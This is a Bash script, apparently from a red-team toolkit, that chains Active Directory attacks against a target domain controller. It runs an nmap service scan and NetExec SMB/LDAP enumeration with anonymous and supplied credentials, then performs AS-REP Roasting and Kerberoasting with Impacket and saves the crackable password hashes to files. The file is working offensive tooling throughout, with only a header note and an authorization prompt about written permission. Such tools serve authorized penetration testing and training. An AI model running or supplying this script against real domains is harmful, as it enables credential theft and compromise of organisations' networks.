#!/usr/bin/env bash
# ============================================================================
# ad_recon.sh - Wrapper de recon em Active Directory a partir de um Linux
#
# Encadeia tres ferramentas comuns do toolkit Impacket / netexec:
#   1. nmap -p 88,389,636,445,3268 para checar servicos AD
#   2. nxc smb / ldap (NetExec) para enumeracao basica
#   3. GetNPUsers.py para AS-REP Roastable
#   4. GetUserSPNs.py para Kerberoastable
#
# Apenas em ambientes onde voce tem autorizacao escrita.
#
# Uso:
#   ./ad_recon.sh -t 10.0.0.10 -d corp.local -u user -p 'PassWord!' [-o out_dir]
#   ./ad_recon.sh -t 10.0.0.10 -d corp.local --userlist users.txt --no-creds
#
# Autor:   Samuel Ziger - RedTeam Essentials
# Versao:  2.0.0
# Licenca: MIT
# ============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/bash/rte_common.sh
source "$SCRIPT_DIR/../lib/bash/rte_common.sh"
rte::install_traps

TARGET=""; DOMAIN=""; USERNAME=""; PASSWORD=""; USERLIST=""
OUTDIR="./output"; NO_CREDS=0

usage() {
    cat <<'EOF'
ad_recon.sh - Recon AD a partir de uma estacao Linux

Opcoes:
  -t, --target   <ip|host>    IP do Domain Controller
  -d, --domain   <fqdn>       FQDN do dominio (ex: corp.local)
  -u, --user     <usuario>    Usuario do dominio
  -p, --pass     <senha>      Senha do usuario
      --userlist <file>       Lista de usuarios para AS-REP Roasting
      --no-creds              Pula passos que exigem credenciais
  -o, --output   <dir>        Diretorio de saida (default ./output)
      --dry-run               Mostra acoes sem executar
  -h, --help                  Esta ajuda
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)   TARGET="$2"; shift ;;
        -d|--domain)   DOMAIN="$2"; shift ;;
        -u|--user)     USERNAME="$2"; shift ;;
        -p|--pass)     PASSWORD="$2"; shift ;;
        --userlist)    USERLIST="$2"; shift ;;
        --no-creds)    NO_CREDS=1 ;;
        -o|--output)   OUTDIR="$2"; shift ;;
        --dry-run)     RTE_DRYRUN=1 ;;
        -h|--help)     usage; exit 0 ;;
        *) rte::fatal "Argumento desconhecido: $1" ;;
    esac
    shift
done

rte::banner "AD Recon" "2.0.0"
[[ -z "$TARGET" || -z "$DOMAIN" ]] && { usage; rte::fatal "target e domain sao obrigatorios"; }
rte::confirm_authorization
rte::require_cmd nmap

mkdir -p "$OUTDIR"
STAMP="$(date +%Y%m%d_%H%M%S)"
PREFIX="$OUTDIR/ad_recon_${DOMAIN}_${STAMP}"

# --- 1. Nmap de servicos AD -------------------------------------------------
rte::info "Nmap dos servicos AD em $TARGET..."
rte::run nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
    -sV --script "(default and safe) and not brute" \
    -oA "${PREFIX}_nmap" "$TARGET" || rte::warn "Nmap retornou erro."

# --- 2. NetExec basico ------------------------------------------------------
if command -v nxc >/dev/null 2>&1; then
    rte::info "NetExec SMB --shares (anonimo)..."
    rte::run nxc smb "$TARGET" -u '' -p '' --shares >"${PREFIX}_nxc_smb_anon.txt" 2>&1 || true

    if [[ $NO_CREDS -eq 0 && -n "$USERNAME" && -n "$PASSWORD" ]]; then
        rte::info "NetExec SMB com credenciais..."
        rte::run nxc smb  "$TARGET" -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" --shares --pass-pol \
            >"${PREFIX}_nxc_smb_creds.txt" 2>&1 || true
        rte::info "NetExec LDAP --users e --groups..."
        rte::run nxc ldap "$TARGET" -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" --users --groups \
            >"${PREFIX}_nxc_ldap.txt" 2>&1 || true
    fi
else
    rte::warn "nxc (NetExec) nao instalado. Pule essa etapa."
fi

# --- 3. AS-REP Roasting -----------------------------------------------------
if command -v GetNPUsers.py >/dev/null 2>&1; then
    rte::info "Tentando AS-REP Roasting (DONT_REQ_PREAUTH)..."
    ULIST_FLAG=""
    [[ -n "$USERLIST" ]] && ULIST_FLAG="-usersfile $USERLIST"
    # shellcheck disable=SC2086
    rte::run GetNPUsers.py "$DOMAIN/" -dc-ip "$TARGET" -no-pass -request \
        $ULIST_FLAG -outputfile "${PREFIX}_asrep.hashes" || \
        rte::warn "GetNPUsers nao retornou hashes."
else
    rte::warn "Impacket GetNPUsers.py nao encontrado."
fi

# --- 4. Kerberoasting -------------------------------------------------------
if [[ $NO_CREDS -eq 0 && -n "$USERNAME" && -n "$PASSWORD" ]]; then
    if command -v GetUserSPNs.py >/dev/null 2>&1; then
        rte::info "Kerberoasting (SPNs)..."
        rte::run GetUserSPNs.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$TARGET" \
            -request -outputfile "${PREFIX}_kerberoast.hashes" || \
            rte::warn "GetUserSPNs nao retornou hashes."
    else
        rte::warn "Impacket GetUserSPNs.py nao encontrado."
    fi
fi

rte::success "Recon AD concluido. Arquivos com prefixo: ${PREFIX}_*"
rte::info  "Proximo passo: alimentar BloodHound (bloodhound.py / nxc ldap --bloodhound)."
